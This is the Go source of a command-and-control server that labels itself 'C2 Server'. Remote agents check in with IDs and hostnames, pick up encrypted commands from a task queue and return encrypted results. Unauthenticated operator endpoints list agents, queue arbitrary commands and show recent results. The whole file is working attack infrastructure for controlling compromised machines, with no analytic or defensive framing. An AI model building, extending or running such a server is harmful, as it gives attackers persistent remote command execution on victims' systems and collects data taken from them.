package main

import (
	"X/internal/crypto"
	"X/internal/db"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
)

func main() {
	database, err := db.InitDB()
	if err != nil {
		log.Fatal("Database connection failed:", err)
	}
	defer database.Close()

	http.HandleFunc("/api/v1/ping", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			return
		}

		agentID := r.Header.Get("X-Agent-ID")
		hostname := r.Header.Get("X-Hostname")

		if agentID == "" {
			return
		}

		db.RegisterPing(database, agentID, hostname, r.RemoteAddr)

		taskID, command, err := db.GetPendingTask(database, agentID)
		if err != nil {
			log.Printf("[DB] Error getting pending task: %v", err)
			w.WriteHeader(http.StatusNoContent)
			return
		}

		if taskID == 0 {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		encryptedCmd, err := crypto.Encrypt(command)
		if err != nil {
			log.Printf("[Crypto] Encryption failed for task %d: %v", taskID, err)
			return
		}

		fmt.Printf("[+] Task Issued → Agent: %s | TaskID: %d\n", agentID, taskID)
		fmt.Fprintf(w, "%d|%s", taskID, encryptedCmd)
	})

	http.HandleFunc("/api/v1/result", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			return
		}

		taskIDStr := r.Header.Get("X-Task-ID")
		body, err := io.ReadAll(r.Body)
		if err != nil {
			log.Printf("[HTTP] Failed to read result body")
			return
		}

		decrypted, err := crypto.Decrypt(string(body))
		if err != nil {
			log.Printf("[Crypto] Decryption failed for task %s: %v", taskIDStr, err)
			return
		}

		var taskID int
		fmt.Sscanf(taskIDStr, "%d", &taskID)

		if err := db.UpdateTaskStatus(database, taskID, decrypted); err != nil {
			log.Printf("[DB] Failed to update task %d: %v", taskID, err)
		} else {
			fmt.Printf("[+] Task %d completed successfully.\n", taskID)
		}

		w.WriteHeader(http.StatusOK)
	})

	http.HandleFunc("/api/v1/agents", func(w http.ResponseWriter, r *http.Request) {
		agents, err := db.GetAllAgents(database)
		if err != nil {
			http.Error(w, "Failed to fetch agents", http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(agents)
	})

	http.HandleFunc("/api/v1/add-task", func(w http.ResponseWriter, r *http.Request) {
		var payload struct {
			AgentID string `json:"agent_id"`
			Command string `json:"command"`
		}

		if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		_, err := database.Exec(`
			INSERT INTO tasks (agent_id, command, status) 
			VALUES (?, ?, 'pending')
		`, payload.AgentID, payload.Command)

		if err == nil {
			fmt.Printf("[*] Task queued → Agent: %s | Command: %s\n", payload.AgentID, payload.Command)
			w.WriteHeader(http.StatusOK)
		} else {
			log.Printf("[DB] Failed to queue task: %v", err)
			http.Error(w, "Failed to queue task", http.StatusInternalServerError)
		}
	})

	http.HandleFunc("/api/v1/results", func(w http.ResponseWriter, r *http.Request) {
		rows, err := database.Query(`
			SELECT id, command, result 
			FROM tasks 
			WHERE status = 'completed' 
			ORDER BY id DESC LIMIT 20
		`)
		if err != nil {
			http.Error(w, "Database error", http.StatusInternalServerError)
			return
		}
		defer rows.Close()

		var results []map[string]interface{}
		for rows.Next() {
			var id int
			var cmd, res string
			if err := rows.Scan(&id, &cmd, &res); err == nil {
				results = append(results, map[string]interface{}{
					"id":      id,
					"command": cmd,
					"result":  res,
				})
			}
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(results)
	})

	http.Handle("/", http.FileServer(http.Dir("./ui")))

	const port = ":8080"
	fmt.Printf("[*] C2 Server  started on http://0.0.0.0%s\n", port)
	fmt.Println("[*] Waiting for agents...")

	log.Fatal(http.ListenAndServe(port, nil))
}
